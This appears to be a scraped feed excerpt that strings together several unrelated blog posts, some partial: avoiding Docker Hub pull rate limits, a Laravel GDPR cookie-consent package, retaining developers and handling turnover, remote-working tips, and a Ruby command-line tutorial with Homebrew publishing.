</code></pre></div><p>Look no further as we show different ways how to overcome the Docker Hub pull rate limit.</p><h2 id="docker-hub-rate-limit-consequences">Docker Hub Rate Limit Consequences</h2><p>In order to better quantify the unique solutions lets try to understand how the rate limit works.</p><ul><li><p>100 pull requests per 6 hours for anonymous users. Enforced via IP Address.</p></li><li><p>200 pull request per 6 hours for users on free tier</p></li><li><p>No pull request limit for paying customers</p></li></ul><p>At first glance the numbers of 100/200 pulls per 6 hours don’t look too restrictive until you find out how Docker Hub measures the rate limit:</p><ul><li>Docker Hub defines a pull request as a <code>GET</code> request on registry manifest URLs (<code>/v2/*/manifests/*</code>).</li></ul><p>In plain English this means, if you for example execute <code>docker pull alpine:3.12</code> twice, your rate limit deducts by two, even if on the second command execution the image wasn’t transferred. Every <code>docker pull</code> count against your quota.</p><p>Hitting the request limit is a piece of cake if you deploy your application stack to a cluster that’s behind a NAT or if you use <code>Always</code> as you pull policy.</p><p>If you want to dive into details and for example see what your current quota is, the <a href="https://docs.docker.com/docker-hub/download-rate-limit/">Download Rate Limit</a> section in Docker Hub documentation is a good starting point.</p><h2 id="1-subscribe-to-docker-hub">#1 Subscribe to Docker Hub</h2><p>You didn’t come here for this recommendation. Reassess once more that Docker Hub is de facto the go-to place for all the Open-Souce software binaries and is free for public images. The pricing for unlimited private repositories is fair as well!</p><p>If you are an individual, or a small team of 2-10 people who just need a space to store images, then paying $5 to $7/month per user is the simplest solution.</p><h2 id="2-mirror-images-to-your-own-registry">#2 Mirror Images to your Own Registry</h2><p>Mirroring or copying images from Docker Hub to your own registry might seem like an overkill at the first glance, it has two major benefits regarding security and governance. Especially if you are using Container in an enterprise context, it is considered being best practice.</p><ul><li><p>Security</p><ul><li>Vulnerability overview and scan of all images before deployment</li><li>Enable polices to prevent vulnerable container images from deployment</li></ul></li><li><p>Governance</p><ul><li>Having a clear picture over all container images, software versions and licenses.</li><li>Assurance that 3rd party images can’t be modified in retrospect.</li></ul></li></ul><h3 id="methods-of-mirroring-images-from-one-registry-to-another">Methods of Mirroring Images from One Registry to Another</h3><p>Apart from mirroring images with the docker CLI with <code>pull</code> and<code>push</code>, two solutions exist that can help to automate the replication process.</p><ol><li><a href="https://goharbor.io/docs/2.1.0/administration/configuring-replication/create-replication-rules/">Harbor &amp; Container Registry</a> build in image replication functionality with policies and event rules.</li><li><a href="https://github.com/containers/skopeo">Skopeo</a> to synchronize images between different container registries.

Yet you get the same benefits of security and governance as with option #2.</p><p>The Proxy Cache is part of the Harbor 2.1 and our Dedicated Container Registry Service. It is easy to set up: When creating a new project select Proxy Cache and select the link to the registry you want to cache.</p><figure><img src="https://container-registry.com/posts/overcome-docker-hub-rate-limit/Harbor-Container-Registry-Create-Proxy-Docker-Hub.png"><figcaption><h4>Creating a Proxy for Docker Hub</h4></figcaption></figure><p>After the Proxy Cache is set up, you can test by pulling an image via the cache by appending your registry name and project, from for example this:<br><code>docker pull postgres:13</code> To <code>docker pull c8n.io/proxy/postgres:13</code></p><figure><img src="https://container-registry.com/posts/overcome-docker-hub-rate-limit/Harbor-Container-Registry-List-All-Proxied-Images.png"><figcaption><h4>List of All Proxied Images</h4></figcaption></figure><h3 id="how-to-make-sure-that-you-only-pull-images-from-your-own-registry">How to Make sure that you only pull images from your own Registry</h3><p>For the policy to work as desired it is necessary to enforce that we fetch images from the private registry and never from Docker Hub. For Kubernetes, two solutions exist to ease the workflow.</p><ul><li><p><a href="https://github.com/IBM/portieris">Portieris</a> is a Kubernetes admission controller to enforce image security policies. You can create image security policies for each Kubernetes Namespace, or at the cluster level, and enforce different rules for different images.</p></li><li><p>Kubernetes <a href="https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/">Dynamic Admission Control</a> allow you to define callbacks and rewrite image specs to point to your internal registry. There is no ready-made solution yet,</p></li></ul><h3 id="working-with-registry-image-secrets">Working with Registry Image Secrets</h3><p>Having unauthenticated access to the container registry is convenient no passwords no users, it just works. The registry credential operator tries to auto inject secrets into the right places.</p><ul><li>The <a href="https://github.com/alexellis/registry-creds">registry-creds operator</a> will propagate a single ImagePullSecret to all Namespaces within your cluster, so we can pull images with authentication.</li></ul></div></div>]]>

                <div><p>In this short tutorial, we will show you how you can add a GDPR compliant cookie popup to your Laravel site.</p><figure data-trix-attachment="{&quot;contentType&quot;:&quot;image/png&quot;,&quot;filename&quot;:&quot;cookie_gdpr.png&quot;,&quot;filesize&quot;:66934,&quot;height&quot;:321,&quot;href&quot;:&quot;https://42coders.com/storage/CsHO87rUraZedIbt0HDofjzF9CEww8Y401AfgMuj.png&quot;,&quot;url&quot;:&quot;https://42coders.com/storage/CsHO87rUraZedIbt0HDofjzF9CEww8Y401AfgMuj.png&quot;,&quot;width&quot;:1182}" data-trix-content-type="image/png" data-trix-attributes="{&quot;caption&quot;:&quot;cookie popup&quot;,&quot;presentation&quot;:&quot;gallery&quot;}"><a href="https://42coders.com/storage/CsHO87rUraZedIbt0HDofjzF9CEww8Y401AfgMuj.png"><img src="https://42coders.com/storage/CsHO87rUraZedIbt0HDofjzF9CEww8Y401AfgMuj.png" width="1182" height="321"><figcaption>cookie popup</figcaption></a></figure><p>Find the Package on the <a href="https://github.com/42coders/eu-cookie-consent">Github</a>!</p><p> Lately, the Courts decided that you need to give your users the option to opt-in for every third-party service you are using. A lot of our clients were asking about a popup like this. Unfortunately, the famous <a href="https://github.com/spatie/laravel-cookie-consent">Spatie package</a> we used on most of our Sites is not addressing this. That was the point where we decided to write our own EU Cookie Consent package.&nbsp;</p><p>&nbsp;Our Goals have been to give users the option to opt-in per service and the developers to check if the user gave permission. As a small goodie, we implemented also an easy way to play out the allowed scripts to your page.</p></div><p><strong>Installation:</strong></p><p>You can install the package via composer:</p><pre><code>composer require the42coders/eu-cookie-consent</code></pre><p><strong>Customize the popup:</strong></p><p>Most of the customization can be done through the config file. First, you need to publish it.</p><pre><code>php artisan vendor:publish --provider="the42Coders\eu-cookie-consent\EuCookieConsentServiceProvider" --tag="config" </code></pre><div><p>The config file has a lot of comments to help you get started.&nbsp;</p><p>The core of the popup is defined in the cookies array. Here you can define the categories and inside of the categories the cookies. Categories are meant to organize the cookie permissions to topics. But feel free to just use one if it fits you.<br>Every parameter in the array which is marked with Optional: in the comment above is optional :). Let's assume you want to add a Facebook cookie permission to the popup.</p><p>This is how the cookies part is looking at the moment.</p></div><pre><code>cookies' =&gt; [
    //The key defines the key in the translations and is used to access the Cookie specific information
    'session' =&gt; [
        //Optional: you can set forced to make it impossible for the user to not accept this cookie.
        'forced' =&gt; 'true',
        //Optional: The description defines the key in the translations
        //'description' =&gt; 'key in translation File'
    ],
    'xsrf-token' =&gt; [
        'forced' =&gt; 'true',
    ],
],</code></pre><p>Now we add facebook permission to it.</p><pre><code>cookies' =&gt; [
    //The key defines the key in the translations and is used to access the Cookie specific information
    'session' =&gt; [
        //Optional: you can set forced to make it impossible for the user to not accept this cookie.
        'forced' =&gt; 'true',
        //Optional: The description defines the key in the translations
        //'description' =&gt; 'key in translation File'
    ],
    'xsrf-token' =&gt; [
        'forced' =&gt; 'true',
    ],
    'facebook' =&gt; [],
],</code></pre><p>Since this Package has multi-language support all the texts are set in the language files. To make changes we need to publish them first.</p><pre><code>php artisan vendor:publish --provider="the42Coders\eu-cookie-consent\EuCookieConsentServiceProvider" --tag="lang" </code></pre><p>In the language file, you just need to add a new key and the content.</p><pre><code>'facebook' =&gt; 'We want facebook to know everything about you. Please let us :).',</code></pre><div><p>That's it! You added new cookie permission to the popup. You can also delete the already existing ones if you don't need them.</p></div><p><strong>Use the Popup:</strong></p><p>Now you want to show the popup on your Laravel site. We recommend to integrate it into your base blade file like the app.blade.php.&nbsp;<br>This will render the Popup HTML and that is all you need.</p><pre><code>{!! EuCookieConsent::getPopup() !!}</code></pre><p><strong>Check for Permissions:</strong></p><p>But now you want to integrate the Facebook connection based on the permission of the user. The package gives you two ways to do so.<br><strong>1. Check for permission in your blade file.</strong></p><pre><code>&lt;head&gt;
    @if(EuCookieConsent::canIUse('facebook'))
        &lt;script&gt;
            alert('all the crazy facebook script stuff');
        &lt;/script&gt;
    @endif
&lt;/head&gt;</code></pre><div><p>This will insert the Script tag only if the User agreed to it in the popup.</p><p><strong>2. Mass render them in your blade file.</strong><br>To do this we need to make a small adjustment to the config file.</p></div><pre><code>'facebook' =&gt; [
    'header' =&gt; '&lt;script&gt;alert(\'all the crazy facebook script stuff\');&lt;/script&gt;',
],</code></pre><p>You can define any non taken key here as you will see later. You just need to use the same on all the cookie permissions you want to render at the same place.<br>In your blade File, you can do this.</p><pre><code>&lt;head&gt;
    {!! EuCookieConsent::getHtml('header') !!}
&lt;/head&gt;</code></pre><div><p>This will collect the header tag from all the cookie permissions the user allowed you to use and just output them here. If you want to have one part in the header and one in the footer you can just define both in the config array.</p></div><p><strong>You made it!</strong></p><p>Your page is now cookie GDPR compliant.&nbsp;<br>If you have any ideas for improvements to this package feel free to contact us.</p>

November 3, 2020 | https://perceptionbox.io/remote-teams/knowledge-management-and-employee-turnover/ | <a href="https://web.archive.org/web/*/https://perceptionbox.io/remote-teams/knowledge-management-and-employee-turnover/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p id="What"><h2>What if a mission-essential team member leaves your team?</h2></p><div><div><p>Let’s tackle this straight away. Few things are more disruptive than when someone leaves the team abruptly, without notice. The thing is, that can happen at any time. Not to be morbid, but accidents happen and health problems can hit suddenly. Contingency planning, like disaster recovery planning, is important for every business. But, what do you do when a key knowledge holder quits before you’ve had time to put a contingency plan in place?</p><p>Unfortunately, this is a worst-case scenario and your options are limited. Evaluate which of your other team members is best qualified to and can fill the vacancy. See if they will. It’s best to give them the option and a suitable reward (compensation). Diligent developers will jump at the chance to prove themselves. But some may not be ready for it – so the risk is that pressuring them will lead them to quit, too.</p><p>If there’s no one else on your team who can fill the role, you need to hire a replacement. Bear in mind, this can take a lot of time. It involves <a href="https://perceptionbox.io/business/staffing-agency-vs-direct-hires-the-opportunity-cost-for-startup-founders/https://perceptionbox.io/business/staffing-agency-vs-direct-hires-the-opportunity-cost-for-startup-founders/">a significant opportunity-cost</a>, especially if it’s left to the startup founder to manage the hiring process. The best option for startups is to work with an IT staffing agency and their talented, vetted pools of highly-skilled software developers and veteran IT specialists. <a href="https://perceptionbox.io/business/choosing-an-it-staffing-agency-in-six-easy-steps/" target="_blank" rel="noopener">Choosing an IT staffing agency</a> will require some effort, but will give you a partner to help with all of your staffing needs.</p></div></div><p id="Project"><h2>Project requirements and data recovery</h2></p><div><div><p>Beyond this, keep all of the documentation the former developer produced – especially the software project requirements. Note that it’s frowned upon legally to go through an employee’s email. But, companies retain the right to access employee work emails if there is a valid business reason to do so. Recovering project-related information and instructions, especially from someone who has left the company, certainly qualifies. Also, check with your remaining team members to see if the developer shared any notes or details they think you should be aware of.</p><p>There’s no doubt that losing a key knowledge-holder or mission-essential team member is a disruption. These efforts will get you back and track to the extent possible.</p></div></div><p id="Additional"><h2>Additional efforts for employees giving notice of leaving</h2></p><div><div><p>It’s a professional best practice and customary for employees to provide advance notice that they intend to leave a company. When they do, you’ll be in much better shape. Immediately determine, as above, if there’s someone on your team able and willing to take their place. Your best bet is to use the remaining time or at least two weeks for a complete handover of the project. The outgoing developer needs to provide training, documentation, and help to identify additional resources to assist their replacement.</p><p>A lot of companies leave it at that, but there’s another option. See if the outgoing developer would be willing to serve as a consultant or part-time specialist for your team. Time requirements can be minimal, as little as 1-8 hours a week. If you can work out an agreement, the disruption will be minimal.</p></div></div><p id=""><h2>Critical retention efforts</h2></p><div><p>Ultimately, the best practice is to do what you can to minimize turnover and the impact of turnover. While some companies go all-out with their retention efforts, there are some critical things to focus on.</p></div><p id="Company"><h2>Company vision</h2></p><div><p>Your company vision says a lot about what your team members can look forward to if they stick around. A company without a vision is at best a placeholder in a dedicated developer’s resume. The company vision needs something for people to “buy” into – whether a groundfloor opportunity in The Next Big Thing, being the premiere (insert niche) specialist in a specific region, or being a growth-minded family owned or community-oriented business. No vision for growth implies no promotions and small raises. Everything else about your company must be consistent with your company vision so it needs to be honest and representative of your visible efforts.</p></div><p id="Continued"><h2>Continued education programs</h2></p><div><div><p>New technologies constantly enter the market. It only makes sense for software developers to be constantly engaged in expanding their skill sets. This applies to two directions – the technical skills your company needs more of now and will need tomorrow. LinkedIn <a href="https://learning.linkedin.com/resources/workplace-learning-report-2018" target="_blank" rel="noopener">indicates 94% of employees</a> will remain with a company longer if it provides continued education opportunities.</p><p>This warrants investing in your development team by giving them the incentive and the practical means to continue developing their skills. It’s in the developers best interest to continuously expand their skills. But, it can be tough with a full-time job plus home and family responsibilities.</p><p>However, you do have a few options for setting up a continued education program. Many companies offer tuition assistance for college and online courses. Online options include sites like <a href="https://www.edx.org/" target="_blank" rel="noopener">EdX</a>, <a href="https://join.skillshare.com/" target="_blank" rel="noopener">LinkedIn Skillshare</a>, <a href="https://www.udemy.com/" target="_blank" rel="noopener">Udemy</a>, <a href="https://ocw.mit.edu/index.htm" target="_blank" rel="noopener">MIT OpenCourseWare</a>, and the<a href="https://www.oeconsortium.org/members/" target="_blank" rel="noopener"> Open Education Consortium</a>. Some companies also offer in-house training and mentorship programs. If you are looking to ramp up fast on skills that your team doesn’t already possess, consider outsourcing with a developer to create a training program, train your team, and provide project oversight.</p><p>Two notes apply to continued education programs. First, it’s a good idea to limit participation until after the six-month anniversary of new hires (when turnover is highest). Second, most companies include a clause in their contract obligating beneficiaries of paid courses to a term of employment. If they separate early, you are entitled to be reimbursed for a portion of the costs Some companies offer training, but don’t provide official certification – making it sort of proprietary as other companies may be reluctant to recognize the training per their own requirements.</p></div></div><div><p><img src="https://perceptionbox.io/wp-content/uploads/2020/11/2.jpg" data-src="https://perceptionbox.io/wp-content/uploads/2020/11/2.jpg" alt="image"></p></div><p id="Career"><h2>Career path program</h2></p><div><div><p>It’s almost standard for developers to change jobs about every two years. Doing so typically nets a 10-20% pay raise, a more senior job title, and more challenging projects. By heeding this standard practice, you can structure a career path program around your continued education program to incentivize keeping your top talent around longer. A career path shines a light on available paths forward within a company based on current and projected needs (vision).</p><p>Simple examples:</p><ul><li>Test Technician &gt; Junior Developer &gt; Developer &gt; Senior Developer &gt; Engineer</li><li>Engineer &gt; Engineering Manager or ML/AI Specialist or Data Scientist</li></ul><p>These titles can extend to more specialized positions or into senior and C-level management.</p><p>You have several options with salaries and compensation to help retain team members.</p><ul><li>Salaries based on job title or as negotiated individually.</li><li>Annual or periodic raises based on time with the company.</li><li>Benefits packages – from 401(k) and stock options to club memberships.</li><li>Employee referral incentives – your team members can be your best recruiters.</li></ul><p>Just as some companies offer a sign-up bonus, incorporate a schedule of incremental tenure bonuses. The military does this by offering reenlistment bonuses for those with special skills to commit to another 2-4 years.</p></div></div><p id="Turnover"><h2>Turnover Triggers and Calendar Tracking</h2></p><div><div><p>Managers will find it useful to keep an employee calendar to track vacation time, performance reviews, birthdays, and company anniversary dates. Being aware of and observing these dates helps to develop trust with your team members. Trust plays an important role in retention.</p><p>A second-year company anniversary is a major turnover landmark. Other triggers that may indicate a team member is at risk of leaving include:</p><ul><li>Announcements of layoffs or acquisition by another company saying there’ll be layoffs</li><li>Other friends or coworkers have recently left</li><li>They didn’t get a recent promotion or expected raise</li><li>They just finished a degree or important certification</li><li>Major life events – deaths in the family, recently married or additions to the family</li><li>Sudden and sustained decreases in production and quality of work</li></ul><p>The more team members trust you and feel they can talk openly with you, the more likely they are to tell you about their plans in advance.</p></div></div><p id="Retention "><h2>Retention with In-House, Distributed and Augmented Teams</h2></p><div><div><p>Retention is critical with teams of all types, but it’s most acute when you have in-house teams that must work on-site. Having actual employees is almost always more expensive than outsourcing. The cost and quality of developers carries over when hiring replacements from a local, often limited, talent pool. Having a vision ahead and a clear cut path to advancing skills, job, and compensation will go a long way to keeping and expanding your top talent.</p><p>By outsourcing with an IT staffing agency, you have a partner to manage retention efforts and provide replacements faster drawing from a larger talent pool. Most companies don’t apply their retention programs for outsourced personnel. Staffing services are very much a part of the “on-demand market” where you only pay for what you need.</p><p>But, nearly all staffing services provide an option for you to directly hire developers. It’s a good practice. Amazon, for example, sources almost all of its seasonal new hires through temporary staffing agencies. Those who last the season and performed in the top 10% have historically been offered full-time job opportunities. Leastwise, when you find someone who fits your team well, who is productive, and happy to learn and take on new challenges – they’re worth keeping.</p></div></div></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>For organisations that use computers to get stuff done, the Internet means you can spread bits of your organisation out geographically and temporally.</p>

<p>Spreading a workforce geographically is usually called remote working or distributed working. That’s when workers aren’t necessarily close to the location of the main office, they live and work elsewhere. There’s also hybrid working, which is when people are expected to come into an office some times but can work from wherever they like the rest of the time.</p>

<p>Spreading a workforce temporally is usually called flexible working or asynchronous working. That’s when workers aren’t always required to be working at the same time as each other. Although more often than not, there’s usually some ‘core hours’ workers have to be present and available.</p>

<p>For various reasons, some groups of people have experimented with the opportunity the Internet has provided. It has allowed them to find new ways of doing things or new ways of living. And, for another variety of reasons, some people haven’t bothered.</p>

<p>Then, in March, that all changed. Anyone who could work online, usually from a computer, was forced to try this stuff out. If their company hadn’t tried out these new ways of working, they became a guinea pig overnight. A <a href="https://www.cliffsnotes.com/literature/f/flowers-for-algernon/character-analysis/algernon">mouse in a maze</a>, without a scientist overseeing the experiment.</p>

<p>That sucks because, as an organisation, you don’t know what works and what doesn’t. Your workers have been forced to try new things and will have reached their own conclusions. Some might like it, others might not be so keen. There will likely be some people for whom the experience has been traumatic, and those people are going to need our help.</p>

<p>So, ignoring whoever’s job it is to do this stuff, I think it’s time for people working on computers to look sideways (metaphorically) and help each other out. If you manage a team or you’re part of a team, it’s time to build your own New Normal.</p>

<p>Here’s some notes I’ve been making on free-range working<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>. And you might like to read about <a href="https://gds.blog.gov.uk/2020/10/07/what-happened-when-we-stopped-having-meetings-and-sending-emails/">this experiment we tried with meetings and emails</a>.</p>

<h2 id="notes-on-free-range-working">Notes on free-range working</h2>

<ol>
  <li>
    <p>We’re trying to create more serendipity for innovation, and make collaboration easier when we’re not in the same place. Show &amp; Tells don’t have to be polished. Share progress, ideas and half-finished thoughts; invite people to comment on your work before it’s completed. This helps replicate putting work up on the wall and giving people a chance to comment on things, especially if they’re not on your team.</p>
  </li>
  <li>
    <p>Check in on your colleagues’ home-working setup. Do they have space? Do they have a desk? Is it well-lit and comfortable? People with better working environments have a new kind of privilege, and so we should be equitable in our approach to free-range working.</p>
  </li>
  <li>
    <p>When everyone you work with is on a screen, everyone is more equal – it’s harder for people to dominate the room. Also, we tend to stop talking over each other and let people finish what they were saying. Cultivate that atmosphere, creating the space for diverse or unheard voices to come to the fore.</p>
  </li>
  <li>
    <p>Spontaneous socialising is a joy. Create a tea break channel and head in there when you’re going to make a cup of tea or coffee. Start a voice chat, either using your work laptop or some headphones connected to a phone.</p>
  </li>

<![CDATA[Create a command-line application with Ruby and publish it via Homebrew]]>

November 3, 2020 | https://longliveruby.com/articles/ruby-command-line-application-homebrew | <a href="https://web.archive.org/web/*/https://longliveruby.com/articles/ruby-command-line-application-homebrew">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The goal of this article is to show you how you can create your command line application using the Ruby programming language and make it available via Homebrew, so anyone can install it quickly and use in seconds.</p>
<p>The article consists of two main parts: building the command line application and making it available via Homebrew.</p>

<p>Our goal is to build a <code>get_joke</code> application that will render a random joke about Chuck Norris. The command will also be able to parse the following arguments:</p>
<ul>
<li><code>random</code> - random jokes that should be displayed. By default, one joke is shown, but if you are prepared to read more, you can pass the <code>-r</code> or <code>--random</code> argument with the number of jokes you would like to see</li>
<li><code>first_name</code> - the first name you would like to see instead of Chuck. It should be possible to pass the custom first name with <code>-f</code> or <code>--first-name</code> argument</li>
<li><code>last_name</code> - the last name you would like to see instead of Norris. It should be possible to pass the custom last name with <code>-l</code> or <code>--last-name</code> argument</li>
<li><code>help</code> - the help command that displays the list of available commands along with the short description. The command is rendered when the <code>-h</code> or <code>--help</code> argument is passed. The command should not display the joke when this argument is passed.</li>
</ul>
<p>As the data source, we will use the <a href="http://api.icndb.com/jokes/random"><code>http://api.icndb.com/jokes/random</code></a> endpoint, which provides a nice and simple API for getting jokes about Chuck.</p>
<p>The program will consist of three parts:</p>
<ul>
<li>Options parsing - we have to parse options passed to the <code>get_joke</code> command. We will achieve it with the <code>OptionParser</code> class, which is a part of the Ruby standard library</li>
<li>Request URL creation - depending on the arguments passed, we have to build a URL that we will call to get the joke or jokes</li>
<li>Request response parsing - once we will perform the request, we have to take care of parsing the response and displaying jokes in the console</li>
</ul>
<p>We won't be using any custom Ruby gems, only code available out of the box with the Ruby.</p>
<h3>Creating executable file</h3>
<p>The very first step is to create an executable file. Create the project directory:</p>
<div><pre><code><span>mkdir</span> <span>get_joke</span>
<span>cd</span> <span>get_joke</span><span>/</span>
</code></pre></div>
<p>and our executable file along with the proper permissions:</p>
<div><pre><code><span>touch</span> <span>bin</span><span>/</span><span>get_joke</span>
<span>chmod</span> <span>+</span><span>x</span> <span>bin</span><span>/</span><span>get_joke</span>
</code></pre></div>
<h3>Creating the program</h3>
<p>We have to add the following shebang line to our script:</p>

<p>This line tells the shell what interpreter should be used to process the rest of the file. It's a preferred approach to the hardcoded interpreter's path to Ruby as it's more portable. We can now execute our program, and we shouldn't see any errors or output:</p>

<p><strong>Parsing arguments passed to the command</strong></p>
<p>As I mentioned before, we will use the <code>OptionParser</code> class, a standard Ruby class for parsing command-line arguments. You can check the documentation <a href="https://ruby-doc.org/stdlib-2.7.0/libdoc/optparse/rdoc/OptionParser.html">https://ruby-doc.org/stdlib-2.7.0/libdoc/optparse/rdoc/OptionParser.html</a></p>
<p>Let's add support for the first argument - <code>random</code> :</p>
<div><pre><code><span>#!/usr/bin/env ruby</span>

<span>require</span> <span>'optparse'</span>

<span>options</span> <span>=</span> <span>{}</span>

<span>parser</span> <span>=</span> <span>OptionParser</span><span>.</span><span>new</span> <span>do</span> <span>|</span><span>parser</span><span>|</span>
  <span>parser</span><span>.</span><span>on</span><span>(</span><span>"-r"</span><span>,</span> <span>"--random RANDOM_JOKES_COUNT"</span><span>,</span> <span>"Render n random jokes"</span><span>)</span>
<span>end</span>

<span>parser</span><span>.</span><span>parse!</span><span>(</span><span>into: </span><span>options</span><span>)</span>

<span>puts</span> <span>options</span><span>.</span><span>inspect</span>
</code></pre></div>
<p>As you can see, the <code>on</code> method from <code>OptionParser</code> takes three arguments:</p>
<ul>
<li>shortcut argument name, which is <code>-r</code> in our case</li>
<li>full argument name which is <code>--random</code> in our case</li>
<li>the description for the argument</li>
</ul>
<p>You can now execute the command with <code>-r</code> argument to see how it's parsed:</p>
<div><pre><code><span>.</span><span>/</span><span>bin</span><span>/</span><span>get_joke</span> <span>-</span><span>r</span> <span>4</span>
<span># =&gt; { random: 4 }</span>
</code></pre></div>
<p>We can add <code>--first-name</code> and <code>--last-name</code> arguments the same way:</p>
<div><pre><code><span>#!/usr/bin/env ruby</span>

<span>require</span> <span>'optparse'</span>

<span>options</span> <span>=</span> <span>{}</span>

<span>parser</span> <span>=</span> <span>OptionParser</span><span>.</span><span>new</span> <span>do</span> <span>|</span><span>parser</span><span>|</span>
  <span>parser</span><span>.</span><span>on</span><span>(</span><span>"-f"</span><span>,</span> <span>"--first-name FIRST_NAME"</span><span>,</span> <span>"Replacement for Chuck's first name"</span><span>)</span>
  <span>parser</span><span>.</span><span>on</span><span>(</span><span>"-l"</span><span>,</span> <span>"--last-name LAST_NAME"</span><span>,</span> <span>"Replacement for Chuck's last name"</span><span>)</span>
  <span>parser</span><span>.</span><span>on</span><span>(</span><span>"-r"</span><span>,</span> <span>"--random RANDOM_JOKES_COUNT"</span><span>,</span> <span>"Render n random jokes"</span><span>)</span>
<span>end</span>

<span>parser</span><span>.</span><span>parse!</span><span>(</span><span>into: </span><span>options</span><span>)</span>

<span>puts</span> <span>options</span><span>.</span><span>inspect</span>
</code></pre></div>
<p>and execute our command to see how arguments are parsed:</p>
<div><pre><code><span>.</span><span>/</span><span>bin</span><span>/</span><span>get_joke</span> <span>--</span><span>random</span> <span>4</span> <span>--</span><span>first</span><span>-</span><span>name</span> <span>John</span> <span>-</span><span>l</span> <span>Doe</span>
<span># =&gt; { random: 4, :'first-name' =&gt; 'John', :'last-name' =&gt; 'Doe' }</span>
</code></pre></div>
<p>The last step is to add support for the <code>--help</code> arugment:</p>
<div><pre><code><span>parser</span> <span>=</span> <span>OptionParser</span><span>.</span><span>new</span> <span>do</span> <span>|</span><span>parser</span><span>|</span>
  <span>parser</span><span>.</span><span>on</span><span>(</span><span>"-f"</span><span>,</span> <span>"--first-name FIRST_NAME"</span><span>,</span> <span>"Replacement for Chuck's first name"</span><span>)</span>
  <span>parser</span><span>.</span><span>on</span><span>(</span><span>"-l"</span><span>,</span> <span>"--last-name LAST_NAME"</span><span>,</span> <span>"Replacement for Chuck's last name"</span><span>)</span>
  <span>parser</span><span>.</span><span>on</span><span>(</span><span>"-r"</span><span>,</span> <span>"--random RANDOM_JOKES_COUNT"</span><span>,</span> <span>"Render n random jokes"</span><span>)</span>

  <span>parser</span><span>.</span><span>on</span><span>(</span><span>"-h"</span><span>,</span> <span>"--help"</span><span>,</span> <span>"Prints this help"</span><span>)</span> <span>do</span>
    <span>puts</span> <span>parser</span>
    <span>exit</span>
  <span>end</span>
<span>end</span>
</code></pre></div>
<p>The command will print a nice help output each time <code>-h</code> or <code>--help</code> argument will be passed:</p>
<div><pre><code>./bin/get_joke --help

# Usage: get_joke [options]
#    -f, --first-name FIRST_NAME      Replacement for Chuck's first name
#    -l, --last-name LAST_NAME        Replacement for Chuck's last name
#    -r, --random RANDOM_JOKES_COUNT  Render n random jokes
#    -h, --help                       Prints this help
</code></pre></div>
<p>The arguments parsing part is done, so we can now begin preparing the API URL to reflect the argument's values passed to our command.</p>
<p><strong>Preparing API URL with values passed as arguments</strong></p>
<p>As I mentioned before, we will use <code>http://api.icndb.com/jokes/random</code> endpoint, which provides the jokes about Chuck Norris. The following combination of the API URL is available:</p>
<ul>
<li>Multiple random jokes - <code>https://api.icndb.com/jokes/random/4</code> - it will provide four random jokes about Chuck Norris</li>
<li>Jokes with the replaced first name - <code>http://api.icndb.com/jokes/random?firstName=name</code> - the value from <code>firstName</code> will replace "Chuck" string in jokes</li>
<li>Jokes with replaced last name - <code>http://api.icndb.com/jokes/random?lastName=name</code> - the value from <code>lastName</code> param will replace "Norris" string in jokes</li>
</ul>
<p>The above variants can be combined to request five random jokes where Chuck Norris's name will be replaced with John Doe.</p>
<p>Here is the part of the code responsible for preparing the proper request URL:</p>
<div><pre><code><span>require</span> <span>'uri'</span>
<span>require</span> <span>'rack'</span>

<span>base_url</span> <span>=</span> <span>"http://api.icndb.com/jokes/random"</span>
<span>base_url</span> <span>+=</span> <span>"/</span><span>#{</span><span>options</span><span>.</span><span>fetch</span><span>(</span><span>:random</span><span>)</span><span>}</span><span>"</span> <span>if</span> <span>options</span><span>.</span><span>key?</span><span>(</span><span>:random</span><span>)</span>
<span>uri</span> <span>=</span> <span>URI</span><span>(</span><span>base_url</span><span>)</span>

<span>query</span> <span>=</span> <span>{</span>
  <span>'firstName'</span> <span>=&gt;</span> <span>options</span><span>[</span><span>:'first-name'</span><span>],</span>
  <span>'lastName'</span> <span>=&gt;</span> <span>options</span><span>[</span><span>:'last-name'</span><span>]</span>
<span>}.</span><span>delete_if</span> <span>{</span> <span>|</span><span>key</span><span>,</span> <span>value</span><span>|</span> <span>value</span><span>.</span><span>nil?</span> <span>}</span>

<span>uri</span><span>.</span><span>query</span> <span>=</span> <span>Rack</span><span>::</span><span>Utils</span><span>.</span><span>build_query</span><span>(</span><span>query</span><span>)</span> <span>unless</span> <span>query</span><span>.</span><span>empty?</span>

<span>puts</span> <span>uri</span><span>.</span><span>to_s</span>
</code></pre></div>
<p>The part consists of two steps:</p>
<ol>
<li>Building the base URL - when the <code>random</code> argument is not passed, one random joke is returned by the default. When the argument is passed, we add it to the end of the path</li>
<li>Building query - we build a simple query and reject params where the value is not given. With a little help of <code>Rack::Utils</code> class, we created a query part of the URL</li>
</ol>
<p>We can test it to see how it's working:</p>
<div><pre><code><span>.</span><span>/</span><span>bin</span><span>/</span><span>get_joke</span>
<span># =&gt; http://api.icndb.com/jokes/random</span>

<span>.</span><span>/</span><span>bin</span><span>/</span><span>get_joke</span> <span>-</span><span>r</span> <span>4</span>
<span># =&gt; http://api.icndb.com/jokes/random/4</span>

<span>.</span><span>/</span><span>bin</span><span>/</span><span>get_joke</span> <span>--</span><span>random</span> <span>4</span> <span>--</span><span>first</span><span>-</span><span>name</span> <span>John</span> <span>-</span><span>l</span> <span>Doe</span>
<span># =&gt; http://api.icndb.com/jokes/random/4?firstName=John&amp;lastName=Doe</span>
</code></pre></div>
<p>The second part is done so we can perform the request to the API and parse the response to render jokes in the console.</p>
<p><strong>Parsing API response and rendering jokes</strong></p>
<p>The goal is to use only code that is available out of the box in Ruby, so to perform the request, we will use the <code>Net::HTTP</code> class and <code>get_response</code> method. The response is in <code>JSON</code> format, so we have to parse it before doing anything else:</p>
<div><pre><code><span>require</span> <span>'net/http'</span>
<span>require</span> <span>'json'</span>

<span>response</span> <span>=</span> <span>Net</span><span>::</span><span>HTTP</span><span>.</span><span>get_response</span><span>(</span><span>uri</span><span>).</span><span>body</span>
<span>parsed_response</span> <span>=</span> <span>JSON</span><span>.</span><span>load</span><span>(</span><span>response</span><span>)</span>
</code></pre></div>
